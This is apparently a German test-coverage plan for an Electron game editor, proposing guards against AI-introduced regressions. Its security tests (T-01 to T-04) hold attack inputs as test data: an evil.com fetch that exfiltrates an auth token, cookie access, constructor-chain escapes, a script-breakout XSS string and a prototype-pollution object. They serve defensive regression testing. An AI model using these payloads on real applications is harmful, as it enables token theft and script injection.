# Test-Coverage-Plan — Stabilitätsnetz gegen KI-Regressionen

> **Datum:** 2026-04-19  
> **Ziel:** Konkrete Tests identifizieren, die typische KI-Fehler frühzeitig abfangen.  
> **Basis:** 36 Unit-/Integration-Tests + 18 Playwright-E2E-Tests (Ist-Stand)

---

## Ist-Analyse

### Was bereits gut abgedeckt ist ✅

| Bereich | Tests |
|:---|:---|
| **Projekt-Integrität** | `project_integrity.test.ts`, `project_store.test.ts`, `snapshot_manager.test.ts` |
| **Flow-Sync** | `flow_sync.test.ts`, `sync_validator.test.ts`, `flow_data_action.test.ts` |
| **Refactoring & Renaming** | `refactoring_manager.test.ts`, `renaming_robustness.test.ts` |
| **Runtime-Ausführung** | `task_executor.test.ts`, `rocket_countdown.test.ts`, `mathe_quiz.test.ts` |
| **Serialization** | `serialization.test.ts` (inkl. Hydration) |
| **Electron Path-Security** | `electron_security.test.ts` (Path Traversal) |
| **HTML-Injection XSS** | `e2e/12_Security_HTMLInjection.spec.ts` (TRichText) |
| **Export-Drift-Detection** | `export_integrity.test.ts` (SHA-256-Checksummen) |
| **Stage-Animation** | `stage_transition_regression.test.ts`, `e2e/14_StageRuntimeAnimation.spec.ts` |
| **Dialog-UI** | `e2e/13_DialogFocusRestore.spec.ts`, `e2e/15_DialogRuntime.spec.ts` |

### Wo die KI am häufigsten Features kaputt macht 🎯

Basierend auf der Commit-Historie und typischen KI-Fehlerklassen:

1. **Standalone-Export funktioniert nicht mehr** (bundle:runtime vergessen, Pfade kaputt)
2. **Security-Regression** (ein geschlossenes Loch wird bei einem Refactor wieder aufgerissen)
3. **Electron-IPC-Breakage** (Handler-Signatur geändert, Preload-Bridge-Mismatch)
4. **Runtime-Breakage bei Component-Änderungen** (neue Komponente nicht in `hydrateObjects` registriert)
5. **Adapter-Pattern-Umgehung** (wieder direkter `fetch()` statt `IStorageAdapter`)
6. **Inspector-Properties nicht serialisiert** (Property fehlt in `getInspectorProperties()` → verschwindet im Export)
7. **`console.*` / `any` / absolute Pfade** wieder eingeführt

---

# Priorisierte Test-Lücken

## 🔴 P1 — Security-Regressionsschutz (kritisch, schnell umsetzbar)

### T-01 `ExpressionParser` Security Suite

**Warum:** JSEP-AST-Migration ist eine Sicherheitsmaßnahme. Ein Refactor könnte den Schutz unbeabsichtigt umgehen.

**Datei:** `src/runtime/ExpressionParser.security.test.ts`

**Zu testen:**
```ts
// Diese MÜSSEN alle `undefined` zurückgeben oder werfen:
ExpressionParser.evaluate('fetch("https://evil.com")', {})
ExpressionParser.evaluate('window.location', {})
ExpressionParser.evaluate('document.cookie', {})
ExpressionParser.evaluate('(()=>{}).__proto__', {})
ExpressionParser.evaluate('obj.constructor.constructor("alert(1)")()', { obj: {} })
ExpressionParser.evaluate('globalThis', {})
ExpressionParser.evaluate('eval("1+1")', {})
```

**Aufwand:** 30 min, ~10 Test-Cases.

---

### T-02 Export Script-Injection Regression

**Warum:** Aktuelles Audit-Finding S-01. Muss getestet werden, sobald der Fix (`</script>`-Escape) eingebaut ist.

**Datei:** `tests/export_script_injection.test.ts`

**Zu testen:**
```ts
const project = { meta: { name: 'Test', description: '</script><script>window.HACKED=true</script>' } };
const html = new GameExporter().generateStandaloneHTML(project, 'dummy-runtime');
// Im Output darf kein ausführbarer </script> Breakout mehr stehen:
expect(html).not.toContain('</script><script>window.HACKED');
expect(html).toContain('<\\/script>'); // Escape muss vorhanden sein
```

Plus: E2E-Test, der das exportierte HTML in eine neue Page lädt und prüft, ob `window.HACKED` undefined bleibt.

**Aufwand:** 20 min.

---

### T-03 Prototype Pollution Regression in `hydrateObjects`

**Warum:** Security Audit #7 ist gefixt (`__proto__`, `constructor`, `prototype` in `reservedKeys`). Aber es existiert **kein dedizierter Test**.

**Datei:** Ergänzung in `tests/serialization.test.ts`

**Zu testen:**
```ts
const malicious = [{ className: 'TButton', name: 'x', __proto__: { polluted: true } }];
hydrateObjects(malicious);
expect(({} as any).polluted).toBeUndefined();
expect(Object.prototype.polluted).toBeUndefined();
```

**Aufwand:** 10 min.

---

### T-04 `DialogExpressionEvaluator` Security

**Warum:** Aktuelles Audit-Finding S-02 (`new Function()` mit Service-Registry-Zugriff). Solange der Fix nicht erfolgt, sollte wenigstens der **Angriffsvektor als xfail-Test** dokumentiert sein.

**Datei:** `tests/dialog_expression_security.test.ts`

**Zu testen (nach Fix):**
```ts
const evil = "fetch('https://evil.com/' + serviceRegistry.get('auth').token)";
expect(() => DialogExpressionEvaluator.evaluateExpression(ctx, `\${${evil}}`))
    .toThrow(/Security|forbidden/);
```

**Aufwand:** 20 min.

---

## 🟠 P2 — Export & Standalone End-to-End

### T-05 Standalone-Export funktioniert eigenständig (Playwright)

**Warum:** Das häufigste „plötzlich kaputt"-Szenario. Aktuell gibt es nur Checksummen-Drift-Detection, aber **keinen Test, der das exportierte HTML real ausführt**.

**Datei:** `tests/e2e/17_StandaloneExport.spec.ts`

**Zu testen:**
1. Projekt im Editor öffnen → Export als Standalone-HTML anstoßen
2. Datei einlesen, in eine `data:text/html;base64,...` URL einbetten
3. In neuer Page laden
4. `window.startStandalone` muss existieren
5. Stage muss gerendert werden (`#run-stage > .game-object` muss `.length > 0` sein)
6. Ein vorkonfigurierter Click-Task muss reagieren

**Aufwand:** 2 h (einmalig Setup).  
**Wert:** Fängt praktisch **alle** Runtime-Bundle/Pfad/Runtime-Version-Bugs auf einen Schlag.

---

### T-06 `bundle:runtime` Freshness-Check

**Warum:** Guideline sagt `npm run bundle:runtime` ist Pflicht nach Runtime-Änderungen. KI vergisst das regelmäßig.

**Datei:** `tests/runtime_bundle_freshness.test.ts`

**Zu testen:**
```ts
const srcMtime = Math.max(...['src/runtime/GameRuntime.ts', 'src/player-standalone.ts', 'src/runtime/GameLoopManager.ts']
    .map(p => fs.statSync(p).mtimeMs));
const bundleMtime = fs.statSync('public/runtime-standalone.js').mtimeMs;

if (bundleMtime < srcMtime) {
    fail(`runtime-standalone.js ist veraltet. Bitte 'npm run bundle:runtime' ausführen.`);
}
```

**Aufwand:** 15 min.

---

### T-07 Export Content Integrity (Whitelist-Check)

**Warum:** `GameExporter.deepClean()` löscht editor-only Keys. Wenn ein KI-Refactor die Whitelist verändert, verlieren Projekte Daten.

**Datei:** Ergänzung in `tests/export_integrity.test.ts`

**Zu testen:**
```ts
const project = testProjectWithAllFeatures();
const clean = new GameExporter().getCleanProject(project);
// Laufzeit-relevante Keys MÜSSEN erhalten bleiben:
expect(clean.stages[0].tasks).toBeDefined();
expect(clean.stages[0].actions).toBeDefined();
expect(clean.stages[0].flowCharts).toBeDefined();
expect(clean.stages[0].variables).toBeDefined();
// Editor-only Keys MÜSSEN entfernt sein:
expect(JSON.stringify(clean)).not.toContain('nodePositions');
expect(JSON.stringify(clean)).not.toContain('flowGraph');
```

**Aufwand:** 30 min.

---

## 🟠 P3 — Electron-IPC & Hardening

### T-08 Electron IPC-Handler Kontrakt

**Warum:** Die Preload-Bridge definiert Methoden, die der Renderer via `window.electronFS` aufruft. Wenn Main-Handler oder Preload-Signatur driftet, bricht das ganze NativeFileAdapter-System.

**Datei:** `tests/electron_ipc_contract.test.ts`

**Zu testen (statisch):**
```ts
const preloadSource = fs.readFileSync('electron/preload.cjs', 'utf-8');
const mainSource = fs.readFileSync('electron/main.cjs', 'utf-8');
const adapterSource = fs.readFileSync('src/adapters/NativeFileAdapter.ts', 'utf-8');

const exposedMethods = [...preloadSource.matchAll(/(\w+):\s*\([^)]*\)\s*=>\s*ipcRenderer\.invoke\(['"]([^'"]+)['"]/g)];
const mainHandlers = [...mainSource.matchAll(/ipcMain\.handle\(['"]([^'"]+)['"]/g)].map(m => m[1]);

// Jede exponierte Methode MUSS einen Handler haben:
for (const [, method, channel] of exposedMethods) {
    expect(mainHandlers).toContain(channel);
}
// Jede Adapter-Nutzung MUSS eine exponierte Methode nutzen:
const adapterCalls = [...adapterSource.matchAll(/window\.electronFS\?\.(\w+)/g)].map(m => m[1]);
const exposedMethodNames = exposedMethods.map(m => m[1]);
for (const call of adapterCalls) {
    expect(exposedMethodNames).toContain(call);
}
```

**Aufwand:** 45 min.  
**Wert:** Fängt Drift zwischen drei Dateien in einem einzigen Test.

---

### T-09 Electron BrowserWindow Hardening

**Warum:** Sichert ab, dass kein KI-Refactor versehentlich `contextIsolation: false` oder `nodeIntegration: true` einschaltet.

**Datei:** `tests/electron_window_hardening.test.ts`

**Zu testen:**
```ts
const mainSource = fs.readFileSync('electron/main.cjs', 'utf-8');
expect(mainSource).toMatch(/nodeIntegration:\s*false/);
expect(mainSource).toMatch(/contextIsolation:\s*true/);
expect(mainSource).not.toMatch(/webSecurity:\s*false/);
expect(mainSource).not.toMatch(/allowRunningInsecureContent:\s*true/);
// Optional nach Hardening (E-02):
// expect(mainSource).toMatch(/sandbox:\s*true/);
// expect(mainSource).toMatch(/setWindowOpenHandler/);
```

**Aufwand:** 15 min.

---

## 🟡 P4 — Architektur-Compliance (CleanCode-Guards)

### T-10 Adapter-Pattern-Compliance

**Warum:** Guideline `DEVELOPER_GUIDELINES.md:132` fordert I/O nur über `IStorageAdapter`. KI-Refactors führen immer wieder direkte `fetch()`-Aufrufe ein.

**Datei:** `tests/architecture_compliance.test.ts`

**Zu testen:**
```ts
const businessLogicFiles = glob.sync('src/{editor,runtime,services}/**/*.ts');
for (const file of businessLogicFiles) {
    if (file.endsWith('.test.ts')) continue;
    if (file.includes('/adapters/')) continue;
    const content = fs.readFileSync(file, 'utf-8');
    // Business-Logik darf kein direktes fetch() oder localStorage verwenden:
    expect(content, `${file}: Nutze IStorageAdapter statt fetch()`).not.toMatch(/\bfetch\s*\(/);
    expect(content, `${file}: Nutze IStorageAdapter statt localStorage`).not.toMatch(/\blocalStorage\./);
}
```

**Ausnahmen:** `src/adapters/`, Test-Dateien, `src/multiplayer/` (WebSocket nutzt eigene Abstraktionen).

**Aufwand:** 20 min.

---

### T-11 Component-Registrierung in `hydrateObjects`

**Warum:** Guideline-Regel (Zeile 274, 302): Jede neue `TComponent` muss im `hydrateObjects`-Switch UND in der `ComponentRegistry` registriert sein. Vergessen = Komponente verschwindet stumm beim Laden.

**Datei:** `tests/component_registration.test.ts`

**Zu testen:**
```ts
const componentFiles = glob.sync('src/components/T*.ts');
const hydrationSource = fs.readFileSync('src/utils/Serialization.ts', 'utf-8');

for (const file of componentFiles) {
    const className = path.basename(file, '.ts');
    if (['TComponent', 'TWindow'].includes(className)) continue; // Basisklassen
    const caseMatch = new RegExp(`case ['"]${className}['"]`);
    expect(hydrationSource, `${className} muss in hydrateObjects() registriert sein`)
        .toMatch(caseMatch);
}
```

**Aufwand:** 20 min.  
**Wert:** Extrem günstig, fängt den häufigsten „Komponente verschwindet"-Bug.

---

### T-12 Inspector-Properties ↔ toDTO() Konsistenz

**Warum:** Guideline-Regel: Jede serialisierungsrelevante Property MUSS in `getInspectorProperties()` registriert sein (da `toDTO()` nur diese iteriert). Sonst verschwindet sie im Export.

**Datei:** `tests/inspector_todto_consistency.test.ts`

**Zu testen:**
```ts
for (const ComponentClass of [TButton, TPanel, TSprite, /* ... */]) {
    const instance = new ComponentClass();
    const dto = instance.toDTO();
    const inspectorProps = instance.getInspectorProperties().map(p => p.name);
    
    // Jede DTO-Property (außer Metadaten) muss in Inspector sein:
    const ignored = ['className', 'id', 'children', 'name', 'x', 'y', 'width', 'height'];
    for (const key of Object.keys(dto)) {
        if (ignored.includes(key)) continue;
        expect(inspectorProps, `${ComponentClass.name}.${key} fehlt in getInspectorProperties()`)
            .toContain(key);
    }
}
```

**Aufwand:** 45 min.

---

## 🟡 P5 — Code-Qualitäts-Gates

### T-13 Kein `console.*` in `src/` (außer Logger/Tests)

**Datei:** `tests/no_console_guard.test.ts`

**Zu testen:**
```ts
const files = glob.sync('src/**/*.ts', { ignore: ['**/*.test.ts', '**/utils/Logger.ts'] });
const offenders: Array<{ file: string; line: number }> = [];
for (const file of files) {
    const lines = fs.readFileSync(file, 'utf-8').split('\n');
    lines.forEach((line, i) => {
        if (/\bconsole\.(log|warn|error|info|debug)\b/.test(line) && !line.trim().startsWith('//')) {
            offenders.push({ file, line: i + 1 });
        }
    });
}
expect(offenders, `Verwende Logger statt console.*:\n${offenders.map(o => `${o.file}:${o.line}`).join('\n')}`).toHaveLength(0);
```

**Initial:** Als Baseline aktuelle Anzahl als Schwelle nutzen, damit CI nur bei **Zunahme** schlägt. Dann iterativ herunter.

**Aufwand:** 30 min.

---

### T-14 Dateigröße-Guard (max. 1000 Zeilen)

**Datei:** `tests/file_size_guard.test.ts`

**Zu testen:**
```ts
const files = glob.sync('src/**/*.ts', { ignore: ['**/*.test.ts'] });
const oversized: string[] = [];
for (const file of files) {
    const lines = fs.readFileSync(file, 'utf-8').split('\n').length;
    if (lines > 1000) oversized.push(`${file} (${lines} Zeilen)`);
}
// Baseline: aktuell 3 Dateien, darf nicht wachsen
expect(oversized.length, `Zu lange Dateien:\n${oversized.join('\n')}`).toBeLessThanOrEqual(3);
```

**Aufwand:** 10 min.

---

### T-15 Kein `new Function()` außerhalb bekannter Ausnahmen

**Datei:** `tests/no_new_function_guard.test.ts`

**Zu testen:**
```ts
const ALLOWED = [
    'src/editor/dialogs/utils/DialogExpressionEvaluator.ts',  // offen, siehe S-02
    'src/editor/dialogs/renderers/DialogDOMBuilder.ts',
];
const files = glob.sync('src/**/*.ts', { ignore: ['**/*.test.ts'] });
for (const file of files) {
    if (ALLOWED.some(a => file.endsWith(a))) continue;
    const content = fs.readFileSync(file, 'utf-8');
    expect(content, `${file}: 'new Function()' ist eine Sicherheitslücke. Nutze JSEP.`)
        .not.toMatch(/new Function\(/);
}
```

**Aufwand:** 10 min.

---

### T-16 Keine absoluten `/pfad`-Assets in Dual-Mode-Code

**Warum:** Guideline Zeile 283: Absolute Pfade brechen unter Electron `file://`.

**Datei:** `tests/no_absolute_paths_guard.test.ts`

**Zu testen:**
```ts
const files = glob.sync('src/**/*.ts');
const patterns = [
    /fetch\(['"]\/[^'"]/,              // fetch('/...')
    /src=\{?['"]\/[^'"]/,               // src='/...'
    /url\(['"]?\/[^'"]/,                // CSS url('/...)
];
for (const file of files) {
    const content = fs.readFileSync(file, 'utf-8');
    for (const pattern of patterns) {
        expect(content, `${file}: Absolute Pfade brechen unter Electron file://`)
            .not.toMatch(pattern);
    }
}
```

**Aufwand:** 20 min.

---

## 🟢 P6 — Nice-to-have (längerfristig)

### T-17 `UniversalPlayer` (player-standalone.ts) Unit Tests
Aktuell komplett ungetestet außer via E2E. Mindestens: Projekt laden, Stage switchen, Render ohne Crash.

### T-18 Snapshot-Tests für kritische JSON-Strukturen
Verhindert ungewollte Format-Änderungen in `stage_blueprint`, `stages[].objects`, `flowCharts`.

### T-19 Performance-Regression (Render-Loop)
60-FPS-Budget-Test: 100 Sprites animieren, `GameLoopManager` darf nicht > 16ms/Frame brauchen.

### T-20 Multiplayer-Konsolidierung gehedged
Einen Test, der beide Multiplayer-Stacks (`MultiplayerManager` vs. `NetworkManager`) gegen dieselbe Protocol-Definition validiert — als Vorarbeit für D-01.

---

# Zusammenfassung & Reihenfolge

| # | Test | Prio | Aufwand | Fängt ab |
|:---:|:---|:---:|:---:|:---|
| T-11 | Component-Registrierung | 🔴 | 20 min | „Komponente verschwindet" |
| T-13 | `console.*` Baseline-Guard | 🔴 | 30 min | Regression durch KI |
| T-14 | Dateigröße-Guard | 🔴 | 10 min | Unkontrolliertes Wachstum |
| T-06 | `bundle:runtime` Freshness | 🔴 | 15 min | Vergessener Bundle-Rebuild |
| T-03 | Prototype Pollution Regression | 🔴 | 10 min | Security-Regression |
| T-01 | ExpressionParser Security Suite | 🟠 | 30 min | Security-Regression |
| T-08 | Electron IPC-Kontrakt | 🟠 | 45 min | Renderer↔Main Drift |
| T-09 | Electron Window Hardening | 🟠 | 15 min | Versehentliche Schwächung |
| T-10 | Adapter-Compliance | 🟠 | 20 min | Direkte fetch()/localStorage |
| T-15 | `new Function()` Guard | 🟠 | 10 min | Security-Regression |
| T-16 | Absolute-Pfade-Guard | 🟠 | 20 min | Electron-Bruch |
| T-07 | Export Content Integrity | 🟡 | 30 min | deepClean Data-Loss |
| T-02 | Export Script-Injection | 🟡 | 20 min | (nach S-01 Fix) |
| T-12 | Inspector↔DTO Konsistenz | 🟡 | 45 min | Verlorene Properties |
| T-05 | Standalone-Export E2E | 🟡 | 2 h | Kompletter Export-Bruch |
| T-04 | DialogEvaluator Security | 🟡 | 20 min | (nach S-02 Fix) |

**Gesamt-Aufwand für P1–P5:** ca. **6 Stunden** → deckt die 10 häufigsten Regressions-Klassen ab.

---

# Empfohlene Umsetzung

## Phase 1 — Quick-Win-Guards (1,5 h)
T-11, T-13, T-14, T-06, T-03, T-15 → Sofort als Baseline aktivieren.

## Phase 2 — Security & Electron (2,5 h)
T-01, T-08, T-09, T-10, T-16 → schützt die kritische Angriffsfläche.

## Phase 3 — Export E2E (2 h)
T-05, T-07, T-02 → deckt den gesamten Export-Pfad ab.

## Phase 4 — Architektur-Sicherung (1 h, später)
T-12, T-04, T-17–T-20 nach Bedarf.

---

# Tooling-Empfehlung

Zusätzlich zum bestehenden `test_runner.ts`:

```json
// package.json
"scripts": {
  "test:guards": "tsx tests/no_console_guard.test.ts && tsx tests/file_size_guard.test.ts && ...",
  "test:security": "tsx src/runtime/ExpressionParser.security.test.ts && tsx tests/electron_security.test.ts",
  "test:compliance": "tsx tests/architecture_compliance.test.ts && tsx tests/component_registration.test.ts",
  "test:pre-commit": "npm run test:guards && npm run test:security"
}
```

Plus: **Pre-Commit-Hook** via `husky` oder einfaches `.git/hooks/pre-commit`, das `test:guards` ausführt.

---

# Lessons für die Junioren

Die hier aufgelisteten Tests folgen fünf Prinzipien:

1. **Statische Guards schlagen Laufzeit-Tests** bei KI-Regressionen. Ein einfacher `fs.readFile + regex`-Check fängt 80 % der typischen Fehler in Sekunden.
2. **Kontrakt-Tests zwischen Grenzen** (Preload↔Main, toDTO↔Inspector, src↔bundle) sind günstig und hochwirksam.
3. **Baselines einziehen, dann iterativ senken.** Man darf die Schwelle für `:any` / `console.*` nicht auf 0 setzen, solange es 1574 gibt — aber auf aktuellen Stand einfrieren.
4. **Security-Tests sind Regressionstests.** Jedes geschlossene Loch braucht einen Test, sonst wird es wieder aufgerissen.
5. **End-to-End für den einen kritischen Pfad.** Standalone-Export ist die wichtigste User-Journey — **ein** guter E2E-Test dafür ist mehr wert als 20 Unit-Tests.
